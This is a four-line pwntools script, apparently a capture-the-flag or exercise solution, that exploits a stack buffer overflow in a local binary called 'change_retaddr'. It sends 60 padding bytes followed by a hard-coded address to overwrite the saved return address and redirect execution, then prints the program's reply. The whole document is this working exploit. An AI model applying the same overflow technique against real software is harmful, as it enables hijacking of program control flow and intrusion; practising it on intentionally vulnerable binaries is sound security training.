from pwn import *
p = process("./src/change_retaddr")
p.sendline("A"*60+"\x66\x91\x04\x08")
print(p.recvline())
